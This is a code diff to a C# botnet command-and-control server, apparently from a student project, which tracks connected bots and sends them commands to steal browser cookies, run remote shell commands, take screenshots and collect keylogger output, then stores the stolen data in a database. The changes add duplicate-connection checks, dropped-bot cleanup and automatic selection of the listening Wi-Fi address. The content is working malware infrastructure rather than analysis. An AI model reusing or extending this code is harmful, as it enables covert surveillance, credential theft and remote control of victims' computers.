@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections;
 using System.Collections.Generic;
 using System.Drawing;
 using System.Drawing.Drawing2D;
@@ -6,6 +7,7 @@ using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
 using System.Net;
+using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Reflection;
 using System.Security.Cryptography.X509Certificates;
@@ -61,7 +63,21 @@ namespace Server
                 Console.WriteLine("Connection received from " + tcplient.Client.RemoteEndPoint);
                 AddBot.addNewBot(tcplient);
                 string clientName = ((IPEndPoint)tcplient.Client.RemoteEndPoint).ToString();
-                clients.Add(tcplient, clientName);
+                //
+                bool hasConnect = false;
+                foreach (var pair in clients)
+                {
+                    if (pair.Value == clientName)
+                    {
+                        hasConnect = true;
+                    }
+                }
+                if(!hasConnect)
+                {
+                     clients.Add(tcplient, clientName);  
+                }    
+         
+                
             }
         }
         public static void handleControlBot(TcpListener listener)
@@ -69,6 +85,15 @@ namespace Server
             while (true)
             {
                 System.Threading.Thread.Sleep(5);
+
+                //foreach (var pair in clients)
+                //{
+                //    Console.WriteLine(pair.Key.Client.RemoteEndPoint.ToString());
+                //}
+
+                checkConnected();
+
+
                 string filePathBotActive = "D:\\xampp\\htdocs\\PBL4\\php\\botActive.txt";
                 string filePathCommandBot = "D:\\xampp\\htdocs\\PBL4\\php\\commandBot.txt";
                 FileInfo fileInfo1 = new FileInfo(filePathBotActive);
@@ -97,6 +122,7 @@ namespace Server
                 //command: nocmd / getcmd/ getcookie/ getkeylogger/ getcapture
                 //detail: dir,.../link / start keylogger, stop keylogger/ start capture, stop capture/
                 //else continue
+ 
                 if (idBot.Equals("All"))
                 {
                     handleCommandAllClients(command, detail);
@@ -117,75 +143,85 @@ namespace Server
         public static async void handleCommandOneClient(string id, string command, string detail, string ipandport)
         {
             TcpClient clientSelected = new TcpClient();
+            Boolean check = false;
             foreach (var pair in clients)
             {
                 if (pair.Value == ipandport)
                 {
                     clientSelected = pair.Key;
+                    check = true;
                     break;
                 }
             }
+            if(check==true)
+            {
 
-            if (command == "getcookie")
-            {
-                isFinished = false;
-                string ms = "cookies?" + detail + "?";
-                sendMessageSocket(ms, clientSelected.Client);
-                receiveFileSocket(clientSelected, "cookies");
-                readFileAndInsertDB(clientSelected, id, "cookies", detail);
-                isFinished = true;
-            }
-            else if (command == "getcmd")
-            {
-                isFinished = false;
-                string ms = "command?" + detail;
-                sendMessageSocket(ms, clientSelected.Client);
-                receiveFileSocket(clientSelected, "cmd");
-                readFileAndInsertDB(clientSelected, id, "cmd", detail);
-                isFinished = true;
-                //
-                //Console.WriteLine(detail);
-            }
-            else if (command == "getcapture")
-            {
-                isFinished = false;
-                string ms = "capture";
-                sendMessageSocket(ms, clientSelected.Client);
-                receiveFileSocket(clientSelected, "capture");
-                readFileAndInsertDB(clientSelected, id, "capture", detail);
-                isFinished = true;
-                //
-                //Console.WriteLine(detail);
-            }
-            else if (command == "getkeylogger")
-            {
-                isFinished = false;
-                string ms = "keylogger";
-                timeStop = DateTime.Now;
-                sendMessageSocket(ms, clientSelected.Client);
-                receiveFileSocket(clientSelected, "keylogger");
-                string timeStartClient = receiveMessageSocket(clientSelected.Client);
-                String time = timeStartClient.Trim() + "?" + timeStop.ToString() + "?";
-                readFileAndInsertDB(clientSelected, id, "keylogger", time); // detail thay bằng time
-                isFinished = true;
-
-            }
-            else if (command == "exit")
-            {
-                isFinished = false;
-                string ms = "exit?stop";
-                sendMessageSocket(ms, clientSelected.Client);
-                if (clients.ContainsKey(clientSelected))
+                if (command == "getcookie")
                 {
-                    clients.Remove(clientSelected);
+                    isFinished = false;
+                    string ms = "cookies?" + detail + "?";
+                    sendMessageSocket(ms, clientSelected.Client);
+                    receiveFileSocket(clientSelected, "cookies");
+                    readFileAndInsertDB(clientSelected, id, "cookies", detail);
+                    isFinished = true;
                 }
-                isFinished = true;
+                else if (command == "getcmd")
+                {
+                    isFinished = false;
+                    string ms = "command?" + detail;
+                    sendMessageSocket(ms, clientSelected.Client);
+                    receiveFileSocket(clientSelected, "cmd");
+                    readFileAndInsertDB(clientSelected, id, "cmd", detail);
+                    isFinished = true;
+                    //
+                    //Console.WriteLine(detail);
+                }
+                else if (command == "getcapture")
+                {
+                    isFinished = false;
+                    string ms = "capture";
+                    sendMessageSocket(ms, clientSelected.Client);
+                    receiveFileSocket(clientSelected, "capture");
+                    readFileAndInsertDB(clientSelected, id, "capture", detail);
+                    isFinished = true;
+                    //
+                    //Console.WriteLine(detail);
+                }
+                else if (command == "getkeylogger")
+                {
+                    isFinished = false;
+                    string ms = "keylogger";
+                    timeStop = DateTime.Now;
+                    sendMessageSocket(ms, clientSelected.Client);
+                    receiveFileSocket(clientSelected, "keylogger");
+                    string timeStartClient = receiveMessageSocket(clientSelected.Client);
+                    String time = timeStartClient.Trim() + "?" + timeStop.ToString() + "?";
+                    readFileAndInsertDB(clientSelected, id, "keylogger", time); // detail thay bằng time
+                    isFinished = true;
 
+                }
+                else if (command == "exit")
+                {
+                    isFinished = false;
+                    string ms = "exit?stop";
+                    sendMessageSocket(ms, clientSelected.Client);
+                    if (clients.ContainsKey(clientSelected))
+                    {
+                        clients.Remove(clientSelected);
+                    }
+                    isFinished = true;
+
+                }
+                else
+                {
+                    Console.WriteLine("Command invalid");
+                }
             }
             else
             {
-                Console.WriteLine("Command invalid");
-            }
+                // viết lại file command Active
+                DB.resetCommandBot();
+            }    
 
         }
 
@@ -452,15 +488,71 @@ namespace Server
             // Console.WriteLine(base64String);
             return base64String;
         }
+        static bool IsConnected(Socket socket)
+        {
+            try
+            {
+                // Sử dụng poll để kiểm tra trạng thái của kết nối
+                return !(socket.Poll(1, SelectMode.SelectRead) && socket.Available == 0);
+            }
+            catch (SocketException) { return false; }
+        }
+        static void checkConnected()
+        {
+            for (int i = 0; i < clients.Count; i++)
+            {
+                if (IsConnected(clients.Keys.ElementAt(i).Client))
+                {
 
+                }
+                else
+                {
+                    DB.resetStatusBotByIpAndPort(clients.Keys.ElementAt(i).Client.RemoteEndPoint.ToString());
+                    clients.Remove(clients.Keys.ElementAt(i));
+                    i--;
+                }
+            }
+           
+               
+                
+        }
+        static string GetLastIPv4Address()
+        {
+            NetworkInterface[] networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
+            string lastIPv4Address = null;
 
+            foreach (NetworkInterface networkInterface in networkInterfaces)
+            {
+                // Kiểm tra xem nếu là interface WiFi và có địa chỉ IPv4
+                if (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211)
+                {
+                    IPInterfaceProperties properties = networkInterface.GetIPProperties();
+
+                    foreach (UnicastIPAddressInformation ip in properties.UnicastAddresses)
+                    {
+                        // Kiểm tra nếu là địa chỉ IPv4
+                        if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                        {
+                            // Lưu lại địa chỉ IPv4 hiện tại
+                            lastIPv4Address = ip.Address.ToString();
+                        }
+                    }
+                }
+            }
+
+            // Trả về địa chỉ IPv4 cuối cùng (hoặc null nếu không tìm thấy)
+            return lastIPv4Address;
+        }
         static void Main(string[] args)
         {
             try
             {
                 DB.resetCommandBot();
                 DB.resetBotStatus();
-                IPAddress address = IPAddress.Parse("172.20.10.4");
+              //  IPAddress address = IPAddress.Parse("172.20.10.4");
+                //IPAddress address = IPAddress.Parse("10.10.28.178");
+                string ipv4Address = GetLastIPv4Address();
+                IPAddress address = IPAddress.Parse(ipv4Address);
 
                 TcpListener listener = new TcpListener(address, PORT_NUMBER);
 
